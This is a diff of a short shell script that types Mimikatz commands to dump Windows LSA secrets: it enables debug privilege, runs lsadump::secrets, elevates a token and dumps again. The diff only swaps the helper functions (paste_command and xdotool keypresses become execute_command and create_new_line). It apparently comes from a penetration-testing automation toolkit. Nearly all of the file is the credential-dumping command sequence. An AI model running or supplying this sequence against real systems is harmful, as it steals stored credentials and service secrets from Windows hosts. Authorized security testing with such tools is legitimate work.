@@ -4,18 +4,18 @@
 Mimikatz: Dump lsa secrets.
 '
 
-paste_command "privilege::debug"
-xdotool key Return
+execute_command "privilege::debug"
+create_new_line
 sleep 1
 
-paste_command "lsadump::secrets"
-xdotool key Return
+execute_command "lsadump::secrets"
+create_new_line
 sleep 1
 
-paste_command "token::elevate"
-xdotool key Return
+execute_command "token::elevate"
+create_new_line
 sleep 1
 
-paste_command "lsadump::secrets"
-xdotool key Return
+execute_command "lsadump::secrets"
+create_new_line
 sleep 1
